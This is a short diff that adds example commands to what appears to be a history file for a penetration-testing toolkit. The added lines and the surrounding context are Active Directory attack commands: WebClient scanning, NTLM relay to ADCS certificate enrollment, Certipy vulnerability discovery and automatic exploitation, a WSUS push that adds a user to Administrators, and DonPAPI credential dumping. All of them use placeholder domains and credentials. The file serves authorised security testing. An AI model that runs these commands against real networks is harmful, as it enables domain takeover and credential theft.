@@ -305,4 +305,9 @@ pass-station search tomcat
 nth --text 5f4dcc3b5aa765d61d8327deb882cf99
 pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
 DonPAPI.py breaking.bad/someadmin:somepassword@sometarget
+webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@dc01.domain.local
+webclientservicescanner -dc-ip dc01.domain.local domain.local/user:password@
+ntlmrelayx -t http://pki.domain.local/certsrv/certfnsh.asp --adcs
+certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' auto -scheme ldap -user 'administrator'
+certipy 'domain.local'/'user':'password'@'domaincontroller' -dc-ip 'domaincontroller' find -scheme ldap -vulnerable
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
